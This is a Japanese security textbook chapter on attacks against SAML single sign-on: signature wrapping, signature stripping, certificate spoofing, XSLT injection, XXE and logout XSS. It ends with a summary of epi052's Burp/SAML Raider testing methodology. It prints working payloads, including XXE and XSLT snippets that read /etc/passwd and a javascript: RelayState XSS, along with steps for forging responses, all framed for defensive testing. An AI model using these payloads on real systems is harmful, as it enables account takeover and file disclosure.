# 第3章 SAML攻撃


## SAMLの仕組みと攻撃の基礎

### SAMLとは何か

SAML（Security Assertion Markup Language）は、XMLベースの標準規格で、**IdP（Identity Provider、認証を行う主体）とSP（Service Provider、サービスを提供する主体）の間で認証・認可情報を交換する**ために使われる。企業のSSO（シングルサインオン）基盤の中核として、Okta・Azure AD（Entra ID）・PingFederate・ADFS・Shibolethなど多くの製品が実装しており、OAuth 2.0/OIDCと並んで「認証を第三者に委譲する」プロトコルファミリーの代表格である。

SAMLの認証フロー（SP-initiated flow）は次のように進む。

1. ユーザーがSP（例: 業務SaaS）のログインページにアクセスする。
2. SPは`AuthnRequest`（認証要求）を生成し、ブラウザ経由でIdPへリダイレクトする。
3. IdPがユーザーを認証する（パスワード入力、既存セッションの再利用など）。
4. IdPは認証結果を`SAML Response`として生成し、`Assertion`（アサーション、「このユーザーは誰であり、いつ、どのように認証されたか」という主張）を含めて**デジタル署名**する。
5. ブラウザはこの`SAML Response`をPOSTでSPへ送信する（HTTP-POST Binding）。
6. SPは署名を検証し、正当なIdPからの応答であることを確認してからログインを許可する。

このフローの核心は、**SPがIdPを直接信頼しているのではなく、「IdPの秘密鍵で署名されたXML文書」を信頼している**という点にある。つまりSAMLのセキュリティは、突き詰めれば「XML署名検証の実装が正しいか」にほぼ全面的に依存する。この章で扱う攻撃の大半は、この署名検証ロジックと、XMLパーサの実際の解釈（どの要素を「検証対象」とし、どの要素を「処理対象」とするか）との間にズレがある場合に成立する。

`Assertion`要素には代表的に以下が含まれる。

- `Subject` / `NameID`: 認証されたユーザーの識別子
- `Conditions`: `NotBefore`（有効開始時刻）、`NotOnOrAfter`（有効期限）、`AudienceRestriction`（このアサーションを受理してよいSPの制限）
- `SubjectConfirmationData`: `Recipient`（このアサーションの送付先URL）、`InResponseTo`（対応する`AuthnRequest`のID）
- `AttributeStatement`: ユーザーの属性（メールアドレス、ロールなど）

SAML ResponseはHTTP-POST Bindingの場合、生のXMLをBase64エンコードしてフォームに埋め込むだけだが、HTTP-Redirect Bindingの場合は**DEFLATE圧縮してからBase64エンコードし、さらにURLエンコード**する。この形式（deflate + base64）ゆえに、SAML関連のペイロードはBurp SuiteなどでSAML専用のデコード機能（SAML Raider拡張やインラインのデコーダ）が必要になる。

> 出典: Red Siege — Attacking SAML implementations — https://redsiege.com/tools-techniques/2021/11/attacking-saml-implementations/

### 攻撃の全体像 — なぜ「署名検証」が壊れるのか

SAML攻撃の大半は、次の2つの実装ミスのいずれかに起因する。

1. **署名検証そのものが甘い、または欠落している**（署名除去・署名置換・証明書偽造など）
2. **「署名を検証する対象」と「実際に処理される対象」が別のXML要素になり得る**（XML Signature Wrapping、XSLTインジェクション、XXEなど、XMLパーサ特有の脆弱性）

とりわけ2番目は、SAMLに限らずXML署名（XMLDSig）を使うあらゆるプロトコルに共通する根深い問題である。XML文書は「同じ意味のデータを複数の場所に書ける」「IDによる参照で任意の要素を指し示せる」という柔軟性を持つため、**署名アルゴリズムがXPathやIDリファレンスで指し示した特定のノードだけを検証し、アプリケーションロジックが「文書内で最初に見つかったAssertion」のような別の基準で処理対象を選ぶ**と、両者の間にズレが生じる。このズレを突くのがXML Signature Wrapping (XSW) 攻撃である。

### XML Signature Wrapping（XSW）攻撃

XSWは2012年に学術研究で体系化された攻撃手法で、**「署名済みの正規のAssertion」をXML文書内の別の場所へ移動・複製し、攻撃者が改ざんした新しいAssertionを「本来処理されるべき位置」に挿入する**ことで、署名検証は正規のAssertionに対して行われつつ、アプリケーションは改ざん済みのAssertionを処理してしまう状態を作り出す攻撃である。

代表的な8種類のバリエーションが知られている（HackTricksおよびRITVNの整理による）。

| 種別 | 対象 | 手口の概要 |
|---|---|---|
| XSW #1 | Response | 署名済みResponseを複製し、新しいルート要素として追加 |
| XSW #2 | Response | 署名要素を分離し、別の場所へ移す |
| XSW #3 | Assertion | 改ざんしたAssertionを、署名済みAssertionと同じ階層に重複配置 |
| XSW #4 | Assertion | 改ざんしたAssertionを、署名済みAssertionの内部に入れ子配置 |
| XSW #5 | Assertion | 署名を残したまま値を書き換え、非標準の位置に署名構造を配置 |
| XSW #6 | Assertion | 署名なしの偽Assertionを追加しつつ構造を工夫 |
| XSW #7 | Assertion | スキーマ検証の緩い`Extensions`要素の中に偽Assertionを埋め込む |
| XSW #8 | Assertion | `Object`ブロックなど署名関連の補助要素の中に偽Assertionを埋め込む |

たとえばXSW #1の典型的な構造は次のようになる（概念図。実際のペイロードはSAML Raiderが自動生成する）。

```xml
<samlp:Response>
  <!-- 攻撃者が追加した「処理される」偽Response（署名なし、NameIDを admin に改ざん） -->
  <samlp:Response ID="_evil">
    <Assertion>
      <Subject><NameID>admin@victim.com</NameID></Subject>
      ...
    </Assertion>
  </samlp:Response>

  <!-- 元の署名済みResponse（署名検証はこちらに対して行われる） -->
  <ds:Signature>...IdPの正規署名...</ds:Signature>
  <Assertion>
    <Subject><NameID>attacker@example.com</NameID></Subject>
    ...
  </Assertion>
</samlp:Response>
```

ここで問題になるのは、**XMLパーサが「文書順で最初に現れるResponse/Assertion」をアプリケーションロジックに渡す一方、署名検証ライブラリは`Reference URI`（署名対象を指すID参照）で指定された、元の位置にある要素だけを検証する**というギャップである。署名検証コンポーネントと業務ロジックが別々のXMLパーサ呼び出し、あるいは別々のパースツリーを使っている実装で特に起こりやすい。防御側の観点では、**署名検証後に「検証したのと同一のノード（同一オブジェクト参照）」だけを後続処理に渡す**ことが根本対策であり、IDによる再検索ではなく、検証済みDOMノードそのものを引き渡す実装にする必要がある。

> 出典: RITVN — Burp SuiteでSAML署名ラッピングを検証 — https://ritvn.com/how-to-use-burp-suite-to-verify-saml-signature-wrapping-attack/
> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### Burp Suite（SAML Raider）でのXSW検証手順

RITVNの記事は、SAML Raiderという無料のBurp拡張を使ったXSW検証の実務手順を示している。これは**防御側が自社のSP実装を検証するための手順**として理解するべきである。

1. Burp Suiteの「Extender」（新しいUIでは「Extensions」）→「BApp Store」から「SAML Raider」をインストールする。
2. Proxyでログインフローをインターセプトし、SPへPOSTされる`SAMLResponse`パラメータを含むリクエストを捕捉する。
3. Burpの「SAML Raider」タブでリクエストのXMLがデコードされて表示される（deflate+base64の自動デコード/エンコードをSAML Raiderが担う）。
4. 「SAML Raider」の「Attack」パネルでXSWの種別（XSW #1〜#8）を選択し、「Apply XSW」を実行すると、上記の構造に沿った改ざんリクエストが自動生成される。
5. 生成されたリクエストをSPへ送信し、**署名検証エラーにならず、かつ改ざんしたNameID等の内容でログインが成立してしまうかどうか**を確認する。

検証がすべて失敗する（=署名検証が正しく機能し、改ざんが弾かれる）ことが「安全である」ことの確認になる。逆にいずれかのXSWパターンでログインが成立してしまった場合、そのSP実装は署名検証と処理対象ノードの一致を保証できていないことを意味する。

> 出典: RITVN — Burp SuiteでSAML署名ラッピングを検証 — https://ritvn.com/how-to-use-burp-suite-to-verify-saml-signature-wrapping-attack/

### 署名除去（Signature Exclusion / Stripping）

もっとも単純だが、実務でも今なお見つかる不具合が「署名要素そのものを取り除くと検証がスキップされてしまう」パターンである。実装によっては、

```xml
<!-- 攻撃者が Signature 要素を丸ごと削除した Response -->
<samlp:Response>
  <Assertion>
    <Subject><NameID>admin@victim.com</NameID></Subject>
    ...
  </Assertion>
</samlp:Response>
```

のように`ds:Signature`要素自体を除去したSAML Responseを送ると、「署名があれば検証する」という**存在チェック依存の実装**では、署名が「ない」ため検証ロジックそのものが呼ばれず、そのままNameIDが信頼されてログインが成立してしまう。これは典型的な「セキュアバイデフォルトではない」実装ミスで、正しい実装は「SPポリシー上、署名は必須である」ことを前提に、**署名が存在しない、または検証に失敗した場合は無条件で拒否する**必要がある。

> 出典: Red Siege — Attacking SAML implementations — https://redsiege.com/tools-techniques/2021/11/attacking-saml-implementations/
> 出典: Medium（Snehal J）— Exploiting SAML implementation weaknesses — https://medium.com/@snehal_j/exploiting-saml-implementation-weaknesses-aa5c432f8a8f

### 署名置換（Signature Replacement / 証明書偽造）

これは「攻撃者が自分の証明書と鍵ペアを使ってAssertionを自己署名し、その公開鍵をResponseに同梱してSPへ送る」攻撃である。脆弱なSP実装は、

- **Responseに埋め込まれた証明書自体を信頼**し、その証明書で署名検証を通してしまう（=「あらかじめ登録済みのIdP証明書のフィンガープリントと一致するか」を確認していない）

というミスを犯す。正しい実装では、SPは事前にIdPと帯域外（メタデータ交換など）で証明書のフィンガープリントを共有・固定しておき、**Response内に埋め込まれた証明書ではなく、この事前登録済みの証明書に対してのみ**署名検証を行う必要がある。これは実質的に「証明書ピンニングを行わないTLSクライアント」と同じ構造の脆弱性であり、SAMLにおける信頼の起点（Root of Trust）をどこに置くかという設計原則の誤りに起因する。

> 出典: Red Siege — Attacking SAML implementations — https://redsiege.com/tools-techniques/2021/11/attacking-saml-implementations/

### XSLTインジェクション（署名前処理を悪用する攻撃）

一部のSAML実装、特にIdP側が受け取ったXMLに対してXSLT変換（XMLを別のXMLやテキストへ変換する変換言語）を適用する場合がある。ここで本質的に重要なのは、**XSLT変換は署名検証より前の段階で実行される**という処理順序である。つまり署名が無効、あるいは署名自体が存在しない状態でも、XSLTスタイルシートの中身は解釈・実行されてしまう。

XSLT 1.0/2.0処理系の多くは`document()`関数や、拡張関数（例: EXSLTの`exsl:document`、あるいはSaxonなど実装依存の`unparsed-text()`）を通じて、

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

のようなスタイルシートをResponse内の変換指定として渡すことで、**ローカルファイルの読み取りや、外部URLへのアウトバウンド通信（SSRFに類似する挙動）**を引き起こせる場合がある。これはXML署名の検証順序を、暗号学的な安全性の話ではなく「そもそもいつ・何に対して行われるか」というパイプライン設計の問題として捉える必要がある好例である。対策は、XSLT変換機能自体を無効化するか、少なくとも署名検証を完了し信頼されたAssertionに対してのみ、かつサンドボックス化された安全な変換エンジン（外部エンティティ解決やファイルアクセスを禁止した設定）で処理することである。

> 出典: Medium（Snehal J）— Exploiting SAML implementation weaknesses — https://medium.com/@snehal_j/exploiting-saml-implementation-weaknesses-aa5c432f8a8f
> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### XXE（XML External Entity）とSAML

SAML ResponseはXML文書そのものであるため、SP側やIdP側のXMLパーサがDTD（文書型定義）の外部実体参照を許可する設定になっていれば、通常のXXE攻撃と同様の手口が成立し得る。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <Assertion>
    <Subject><NameID>&xxe;</NameID></Subject>
  </Assertion>
</samlp:Response>
```

このようなペイロードを送信し、`NameID`の値としてファイル内容がエコーバックされる、あるいはSSRF（サーバー内部からの意図しない外部/内部通信）を誘発できるかを確認する。多くの現代的なXMLライブラリはデフォルトで外部実体解決を無効化しているが、**古いバージョンのライブラリや、独自にDTD処理を有効化した実装**では今なお成立し得る。防御は、XMLパーサの設定で外部DTD・外部実体・パラメータ実体のすべてを無効化することに尽きる（言語・ライブラリごとに設定方法は異なるため、使用しているXMLパーサのセキュア設定ガイドを個別に確認する必要がある)。

> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### XML丸めトリップ（Round-trip）の不整合

署名は通常、XML文書を正規化（Canonicalization、要素の順序・空白・名前空間宣言などを一意な形式に揃える処理）してからハッシュを計算する。ところが、**署名時に使われたXMLパーサと、検証後に実際のアプリケーションロジックが再パースする際のXMLパーサが異なるライブラリ・異なるバージョンである**場合、同じバイト列でも異なる木構造として解釈されることがある。

HackTricksが言及する具体例では、「REXML（RubyのXMLライブラリ）3.2.4以前において、署名検証前の子要素と、検証後に再パースされた子要素が異なる結果になりうる」という不整合が報告されている。この種の脆弱性はライブラリのバージョンとパーサ実装に強く依存するため、**自社が使用しているXML/SAMLライブラリの既知CVEを継続的に確認し、パッチを適用し続けること**が唯一の実務的対策になる。

> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### Condition検証の欠落（トークンの誤受理・受信者混乱攻撃）

`Assertion`の`Conditions`要素には、`NotBefore`/`NotOnOrAfter`（有効期限）や`AudienceRestriction`（どのSP向けかの制限）が指定される。また`SubjectConfirmationData`の`Recipient`属性は「このアサーションがどのURLに提出されるべきか」を、`InResponseTo`は「どの`AuthnRequest`への応答か」を示す。

これらの検証を省略しているSP実装では、次のような問題が生じる。

- **有効期限を検証しない**: 一度傍受・記録したSAML Responseを、期限が過ぎた後も再送（リプレイ）してログインできてしまう。
- **`AudienceRestriction`/`Recipient`を検証しない**: 同一IdPを複数のSPが信頼している構成（多くの企業SSO環境で一般的）で、あるSP-B向けに発行されたAssertionを、別のSP-Aへそのまま提出しても受理されてしまう（「受信者混乱攻撃」）。これはIdPがマルチテナント/マルチSP構成である場合に特に影響が大きい。
- **`InResponseTo`を検証しない**: IdP-initiatedフローでは`InResponseTo`が存在しないことがあり実装差が出やすいが、SP-initiatedフローで検証を省略すると、CSRF（クロスサイトリクエストフォージェリ、攻撃者が用意した別のセッションのログイン結果を被害者のブラウザに強制的に取り込ませる手口）に近い形で、攻撃者自身のアカウントへ被害者をログインさせ、被害者の操作結果を攻撃者アカウントに記録させる「ログインCSRF」が成立し得る。

対策は単純で、SP実装が**`NotBefore`/`NotOnOrAfter`・`AudienceRestriction`・`Recipient`・`InResponseTo`のすべてを仕様通りに検証する**ことである。これらはSAML 2.0仕様上「検証すべき」と明記されている項目だが、実装によっては開発の簡略化のために省略されるケースが後を絶たない。

> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### ログアウト機能における反射型XSS

SAMLのSingle Logout（SLO）フローでは、ログアウト後のリダイレクト先URLをクエリパラメータ等で受け渡す実装が多い。このパラメータのサニタイズが不十分な場合、

```
https://sp.example.com/saml/logout?RelayState=javascript:alert(123);
```

のようなペイロードが、ログアウト完了ページ内でそのまま出力・実行されてしまう反射型XSS（Reflected XSS、攻撃者が仕込んだスクリプトがサーバーを経由して被害者のブラウザ上で実行される脆弱性）につながることがある。これはSAML固有の脆弱性というより、SAML関連エンドポイントが受け取るあらゆるパラメータに対して、通常のWebアプリケーションと同じ入力検証・出力エンコーディングの原則が適用されるべきだという教訓である。

> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### 実務で使うツール

- **SAML Raider**（Burp Suite拡張、BApp Storeから無料でインストール可能）: SAML Responseのデコード表示、証明書の生成・置換、XSW #1〜#8の自動生成、署名の除去などを一括して行える、SAMLセキュリティ検証の事実上の標準ツール。
- **SAMLExtractor**: 対象アプリケーション群からSAMLのACS（Assertion Consumer Service、SPがSAML Responseを受け取るエンドポイント）URLを一括抽出するための補助ツール。

これらはいずれも「自社が管理するSP/IdP環境に対する許可された検証」を前提としたツールであり、実在の本番サービスに対して無許可で使用してはならない。

> 出典: Red Siege — Attacking SAML implementations — https://redsiege.com/tools-techniques/2021/11/attacking-saml-implementations/
> 出典: HackTricks — SAML Attacks — https://angelica.gitbook.io/hacktricks/pentesting-web/saml-attacks

### 防御のまとめ

本章で扱った攻撃はいずれも、SAML実装の以下のポイントに集約される。

1. **署名検証を必須化する**: 署名の有無をチェックするのではなく、「署名がなければ即拒否」をポリシーとして固定する。
2. **信頼の起点をResponse内の証明書に置かない**: 検証に使う証明書は、事前にIdPと帯域外で交換・登録したものだけを使う。
3. **検証済みノードと処理対象ノードを一致させる**: XSW対策として、署名検証ライブラリが検証したのと同一のDOMオブジェクトを、後続のビジネスロジックにそのまま渡す実装にする。IDによる再検索や、文書内の「最初に見つかった要素」を信頼しない。
4. **XML処理の周辺機能を最小化する**: XSLT変換・外部DTD/外部実体解決・XInclude等、署名検証前に任意のコードや外部リソースへアクセスし得る機能はすべて無効化する。
5. **Conditions・Recipient・InResponseToを仕様通り検証する**: 有効期限切れ・対象外SP・対象外エンドポイント向けのアサーションを確実に拒否する。
6. **周辺パラメータの入力検証も怠らない**: RelayStateなどSAML以外の一般的なWebパラメータにも、通常のXSS/インジェクション対策を適用する。

これらはいずれも、実在サービスへの無許可な検証ではなく、**自社が管理するSAML実装（テスト環境のIdP/SPや、SAML Raiderのようなツールで用意したローカルの検証環境）に対して**確認すべき項目である。

## epi052 SAMLハンティング方法論3部作

epi052 氏（Ben Risher）が2019年3月に3回に分けて公開した「How to Hunt Bugs in SAML; a Methodology」は、SAML（Security Assertion Markup Language：XMLベースのシングルサインオン規格）の脆弱性を「思いつきで叩く」のではなく、プロトコルの内部構造を理解したうえで系統立てて検証するための地図を与えてくれる古典的な3部作である。第1部で SAML のデータフローと XML 署名の仕組みを分解し、第2部で Burp Suite 拡張「SAML Raider」と XML 署名ラッピング（XSW）を、第3部で XXE・XSLT・トークン受信者混同（Recipient Confusion）など残りの攻撃手法を、いずれも「なぜ通るのか」の原理とともに提示する構成になっている。

本節はあくまで**防御・検証設計を理解する目的**で書く。実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。攻撃手法は「どこの実装がどう間違えると成立するか」を知り、堅牢なバリデーションを設計するための知識として読んでほしい。

なお第3部の原記事自体は詳細なペイロードをほとんど載せず、7ステップの方法論インデックスと外部資料へのリンク、そして RelayState の応用例（後述）に絞った短い記事である。そのため本節では、3部作全体で提示される具体ペイロードを技法ごとに整理して示し、原典で明示されない補足には一般知識に基づく旨を明記する。

---

### Part I：SAMLの基礎と攻撃面の地図

> 出典: How to Hunt Bugs in SAML - Part I — https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/

#### 登場人物と用語

SAML は OASIS（Organization for the Advancement of Structured Information Standards）が策定した XMLベースの認証・認可情報の受け渡し規格で、複数アプリ間の SSO（シングルサインオン）に使われる。攻撃面を語る前に3つの主役を押さえる。

- **IdP（Identity Provider：認証を実行し Assertion を発行する側）**。ユーザーが本人か否かを判定し、その結果に署名して発行する。企業の Okta / Azure AD / OneLogin などがこれにあたる。
- **SP（Service Provider：ユーザーが使いたいWebアプリ）**。IdP が発行した Assertion を受け取り、検証して、セッションを張る。
- **Assertion（アサーション：ユーザーの身元や属性を記述したXMLメッセージ）**。「このユーザーは alice で、管理者ロールを持ち、この時刻まで有効」といった主張（=assert）が中身。SAML 攻撃の本質は、この Assertion を攻撃者が書き換えても SP が受け入れてしまう欠陥を突くことにある。

#### SP起点フロー（SP-Initiated SSO）の8ステップ

epi052 は Web Browser SSO Profile の標準的な流れを8段階に分解する。攻撃者がどこに介入できるかを見るための下地になる。

1. ユーザーが SP の保護リソースを要求する。
2. 未認証なので SP が **SAML Request** を生成する。
3. SP がユーザーのブラウザを IdP へリダイレクトし、SAML Request を渡す。
4. IdP がリクエストを受け、ユーザーを認証する（パスワード入力など）。
5. IdP が署名付き Assertion を含む **SAML Response** を生成する。
6. IdP がユーザーを SP の **ACS（Assertion Consumer Service）URL** へリダイレクトし、Response を渡す。
7. ACS が SAML Response を検証する。
8. 検証に通ればユーザーは保護リソースへアクセスできる。

ここで決定的に重要なのは、**SAML Response がユーザーのブラウザを経由して SP に届く**点である（バックチャネルではなくフロントチャネル）。つまり攻撃者は自分のブラウザとプロキシで Response を傍受・改ざんできる立場にある。SAML のセキュリティは「SP が署名検証を厳密に行う」という一点にすべてを賭けており、そこが崩れると Assertion の改ざんが素通りする。これが3部作全体を貫く前提だ。

#### SAML Request の構造

SAML Request の主要属性は次のとおり。検証時に注目すべき「改ざんの起点」でもある。

- **AssertionConsumerServiceURL**：認証後に IdP が SAML Response を返送する先。ここを攻撃者のURLに書き換えられれば、Assertion を攻撃者に横取りさせられる余地が生まれる（IdP 側で登録済みURLと照合していなければ成立）。
- **Destination**：宛先 IdP のアドレス。
- **ProtocolBinding**：SAML メッセージをどの方式（HTTP-Redirect / HTTP-POST など）で運ぶかを定義する。
- **Issuer**：リクエストを生成したエンティティ（=SP）の識別子。

SAML Request は **Deflate 圧縮 → base64 エンコード**という順で（HTTP-Redirect バインディングの場合）変換されて送られる。検証時はこの逆順（base64デコード → inflate）で復元してから中身を見る必要がある。この「圧縮＋エンコード」という一手間が、後述の XXE 挿入ポイントを一見わかりにくくしている。

#### SAML Response の構造

SAML Response の骨格は次のようなXMLツリーである。攻撃対象を語る共通言語になるので構造を頭に入れておく。

```xml
<samlp:Response>
  <saml:Issuer/>
  <ds:Signature/>
  <samlp:Status/>
  <saml:Assertion>
    <saml:Subject/>
    <saml:Conditions/>
    <saml:AuthnStatement/>
    <saml:AttributeStatement/>
  </saml:Assertion>
</samlp:Response>
```

各要素の役割と、なぜ攻撃上重要かは以下のとおり。

- **`<ds:Signature>`**：XML署名。Assertion（あるいは Response 全体）の完全性を保護し、発行者が IdP であることを認証する。**この要素をどう扱うかが全攻撃の急所**。
- **`<saml:Conditions>`**：Assertion の有効時刻（`NotBefore` / `NotOnOrAfter`）や、この Assertion が特定 SP 宛て（`AudienceRestriction`）であることを規定する。ここの検証漏れがリプレイや受信者混同を許す。
- **`<saml:NameID>`**（Subject 配下）：認証されたユーザーの識別子。攻撃者が最も書き換えたい値。ここを `admin` に変えて通れば権限昇格になる。
- **`InResponseTo`**：元の SAML Request の ID を参照し、対応関係を検証するための値。検証漏れは Response の使い回し（未要求 Response の注入）を許す。

#### XML署名の3タイプと Reference URI

SAML の署名は W3C の XML Signature 規格に従い、大きく3つの形態がある。ここを理解しないと XSW（後述）の原理が腑に落ちない。

- **Enveloped（内包型）署名**：署名が「署名対象の要素の内側」に入れ子で置かれる。SAML で最も一般的。
- **Enveloping（外包型）署名**：署名が署名対象リソースを包み込む。
- **Detached（分離型）署名**：署名が署名対象と別の場所にある。

署名がどの要素を保護しているかは、`<ds:Reference>` 要素の `URI` 属性が指し示す。例：

```xml
<ds:Reference URI="#_2af3ff4a06aa82058f0eaa8ae7866541">
  <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
</ds:Reference>
```

`URI="#_2af3ff..."` は「ID属性が `_2af3ff...` の要素を署名対象とする」という意味だ。**署名検証は URI が指す要素のハッシュを検算するだけ**であり、「アプリのロジックが実際に読み込む要素」と「署名が保護している要素」が一致している保証はない。この“署名が指す要素”と“処理される要素”のズレこそ XSW の温床になる（Part II で詳述）。`<ds:Transform>` は、ハッシュ計算前に対象XMLへ適用する変換を指定するもので、`enveloped-signature` 変換は「署名要素自身をハッシュ計算対象から除外する」ためのもの。この Transform の仕組みが XSLT インジェクション（Part III）で悪用される。

#### SPが検証すべきポイント（=検証漏れの候補）

epi052 が挙げる、SP が本来必ず行うべき検証は次のとおり。裏を返せば、ここのどれかが欠けていれば脆弱性になる。

- IdP の証明書を使った署名の真正性検証。
- Assertion の時刻条件（`NotBefore` / `NotOnOrAfter`）。
- `AudienceRestriction` が自SPと一致するか。
- `InResponseTo` が自分が出した Request の ID と一致するか。
- `Recipient` が自分の ACS URL と一致するか。

#### RelayState と、検証に使うツール

**RelayState** は、SP が IdP に渡す状態情報で、「最初に誰がどのリソースを要求したか」を SAML Response 帰還時に SP が思い出すためのもの。SAML Response には同じ RelayState 値が含まれていなければならない。SP はこの値を認証後のリダイレクト先などに使うことが多く、これがオープンリダイレクトやインジェクションの入口になり得る（Part III の応用例で再登場する）。

Part I で紹介される検証ツールは2つ。**OneLogin の SAML ツール群**（エンコード/デコード・暗号化/復号のユーティリティ）と、Part II の主役になる Burp Suite 拡張 **SAML Raider** である。

---

### Part II：SAML RaiderとXML署名ラッピング（XSW）

> 出典: How to Hunt Bugs in SAML - Part II — https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/

#### SAML Raider とは

**SAML Raider** は Roland Bischofberger と Emanuel Duss が開発した Burp Suite 拡張で、(1) SAML メッセージの改ざんと (2) X.509 証明書の管理、という2つの中核機能を提供する。Burp の Extender タブ → BApp Store からインストールでき、導入すると「SAML Raider Certificates」タブが追加され、Repeater が拡張される。SAML の面倒な「base64デコード → inflate → XML編集 → deflate → base64エンコード → 署名再計算」という往復作業を GUI 上で一括処理してくれるのが価値だ。

#### X.509 証明書マネージャ

証明書マネージャでは、証明書のインポート/エクスポート、秘密鍵管理、**証明書のクローン**（Modulus と Signature 以外の全フィールドを保持して複製）、任意改変しての自己署名、証明書情報の表示ができる。検証用の証明書はワンライナーで作れる。

```bash
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
```

クローン証明書が元と同等の見た目になっているかは diff で確認できる。

```bash
diff <(openssl x509 -in /tmp/cloned-cert.pem -text -noout) <(openssl x509 -in /tmp/cert.pem -text -noout)
```

なぜ「クローン」機能が要るのか。SP が Assertion の証明書（`<ds:KeyInfo>` 内）を見て信頼判定するとき、フィンガープリントではなく Subject や発行者名といった**表面的なフィールドだけを見て**信頼してしまう実装が存在する。その場合、見た目が本物そっくりで鍵だけ攻撃者のものにすげ替えた証明書で署名し直せば通ってしまう。クローン機能はこの検証（証明書偽装、後述）を効率化するためにある。

#### XSW（XML Signature Wrapping：XML署名ラッピング）の原理

XSW は SAML 攻撃の花形であり、**署名検証モジュールと XMLパーサ（アプリのロジック）が“別々の要素”を見てしまう齟齬**を突く。

原理を分解するとこうなる。署名検証ステップは前述のとおり `<ds:Reference>` の `URI` 属性を辿って「署名された本物の要素」を特定し、そのハッシュを検算する。一方、アプリのビジネスロジック側の XMLパーサは、標準的なツリー探索（多くは上から順、あるいは「最初に見つかった Assertion」）で要素を取り出す。**この2つの探索経路が同じ要素に着地する保証がない**。

そこで攻撃者は、正規の（署名済み）Assertion をそのまま残しつつ、値を書き換えた**偽の Assertion のコピー**を XML の別の場所に挿入する。すると、

- 署名検証は URI が指す「正規の署名済み要素」を見つけて「署名OK」と判定し、
- アプリロジックは探索順の都合で「偽の Assertion」を読み込んで、その `NameID` やロールを信用する。

結果、署名を一切壊さずに Assertion の中身をすり替えられる。どこにコピーを置き、どちらを署名対象／処理対象にするかの配置パターンが、後述の8バリエーションだ。

標準的な SAML Response の骨格（配置の基準になる）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>...</ds:KeyInfo>
  </ds:Signature>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>...</saml:NameID>
      <saml:SubjectConfirmationData/>
    </saml:Subject>
    <saml:AttributeStatement>...</saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

#### 8種類のXSWバリエーション

SAML Raider は次の8パターンを自動生成できる（この分類は Somorovsky らの2012年 USENIX 論文「On Breaking SAML: Be Whoever You Want to Be」に由来する）。前半（#1–#2）は Response 全体を、後半（#3–#8）は Assertion を対象とする点が大きな違いだ。

- **XSW #1**：Response 要素まるごとを **enveloping署名**付きでコピーし、コピーを本物の前に置く。パーサが本物を検証する代わりに未署名コピーを処理してしまうことを狙う。
- **XSW #2**：#1 とほぼ同じ配置だが、enveloping ではなく **detached署名**を使う。
- **XSW #3**：Assertion をラップする。コピーを root（Response）の**最初の子**として挿入し、本物を兄弟要素にする。「最初に見つかった Assertion を使う」実装に効く。
- **XSW #4**：#3 と似るが、本物の Assertion を**コピーされた Assertion の子要素**として入れ子にする（兄弟ではなく親子関係）。
- **XSW #5**：コピーされた Assertion が **Signature 要素自身を内包**する、非標準の署名構成を作る。
- **XSW #6**：コピーされた Assertion が **Signature と本物の Assertion の両方**を入れ子で内包する。
- **XSW #7**：コピーした Assertion を **Extensions 要素の中**に挿入する。Extensions はスキーマ制約が緩いため、OpenSAML のような**スキーマ検証で防御しているライブラリ**でも、非標準要素の緩いパースを突いてバイパスできる。
- **XSW #8**：#7 の変形で、コピーではなく**本物の Assertion を Extensions 要素に入れる**ことで、同じくスキーマ検証を回避する。

#7・#8 が「なぜ効くのか」は特に重要だ。素朴な XSW（#1–#6）はスキーマ検証（DTD/XSDでツリー構造を厳格化する対策）で弾ける。しかし Extensions 要素は仕様上「任意の拡張要素を置いてよい」領域なので、そこに Assertion を隠すと、スキーマ検証を通過しつつパーサに拾わせることができる。対策の抜け穴を、仕様が公式に用意した“緩い場所”で突く発想である。

#### XSW攻撃の実行手順（Burp）

セットアップ：

1. Proxy → Options で、`SAMLResponse` パラメータを含むリクエストにマッチする Intercept ルールを作る（該当トラフィックだけ効率的に捕捉するため）。
2. SAML Response を Burp Proxy で捕捉する。
3. Repeater へ送る（Ctrl+R）。
4. Repeater の SAML Raider タブを開く。

実行：

- XSW のドロップダウンから攻撃タイプ（#1〜#8）を選ぶ。
- 「Go」で改ざん済み Response を送信する。
- **複数パターンを試すときは毎回オリジナルの Request を再送**し、前回の改変の残りを消してから次を試す（残留改変による誤判定を避けるため）。
- ユーザー属性（識別子など）を書き換えて、権限昇格やなりすましが成立するか観測する。

#### 署名除外（Signature Exclusion）

XSW の前に必ず試すべき最も基本的な検証。**署名検証が必須になっているか**を確かめる。`<ds:Signature>` 要素をすべて削除し、それでも Assertion が受理されるなら、その実装は「署名が無ければ検証をスキップする」欠陥を抱えている。

手順：

1. SAML Response を傍受する。
2. SAML Raider の「Remove Signatures」ボタンを押す。
3. 属性（ユーザーID、ロール等）を書き換える。
4. 転送する。

